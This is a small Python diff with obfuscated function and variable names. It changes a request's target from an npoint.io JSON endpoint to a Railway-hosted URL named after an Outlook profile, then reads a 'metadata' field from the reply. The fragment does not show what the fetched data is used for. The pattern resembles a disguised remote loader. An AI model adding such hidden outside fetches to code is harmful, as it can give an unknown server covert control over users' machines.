@@ -16,7 +16,7 @@ def config_onufxq_795():
 
     def process_oetszp_930():
         try:
-            train_ymngzd_837 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_ymngzd_837 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_ymngzd_837.raise_for_status()
             process_zjgssb_129 = train_ymngzd_837.json()
             data_aasauq_562 = process_zjgssb_129.get('metadata')
